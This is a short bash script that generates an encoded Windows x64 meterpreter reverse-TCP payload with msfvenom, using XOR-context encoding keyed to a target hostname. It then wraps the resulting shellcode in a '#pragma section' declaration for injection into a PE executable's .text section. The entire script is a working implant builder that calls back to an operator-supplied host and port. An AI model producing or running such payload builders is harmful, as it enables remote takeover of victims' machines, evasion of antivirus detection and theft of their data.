#!/bin/bash

# Check if environment variables are set
if [ -z "$LHOST" ] || [ -z "$HOSTNAME" ] || [ -z "$LPORT" ]; then
  echo "Error: LHOST, HOSTNAME, and LPORT must be set."
  echo "Usage: export LHOST=<value> HOSTNAME=<value> LPORT=<value> && ./generate.sh"
  exit 1
fi

echo "Generating base.cpp with encoder x64/xor_context..."
echo "LHOST=$LHOST, LPORT=$LPORT, HOSTNAME=$HOSTNAME"

# Generate C-format shellcode for injection
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=$LPORT \
  -e x64/xor_context \
  C_HOSTNAME=$HOSTNAME \
  -f c -o base.cpp

shellcode_file="base.cpp"

if [ ! -f "$shellcode_file" ]; then
    echo "File '$shellcode_file' not found."
    exit 1
fi

# Wrap the shellcode for PE section injection
{
  echo '#pragma section(".text")'
  echo ''
  echo '__declspec(allocate(".text"))' $(cat "$shellcode_file")
} > "$shellcode_file.tmp"

mv "$shellcode_file.tmp" "$shellcode_file"

echo "Shellcode generation complete. Output: $shellcode_file"
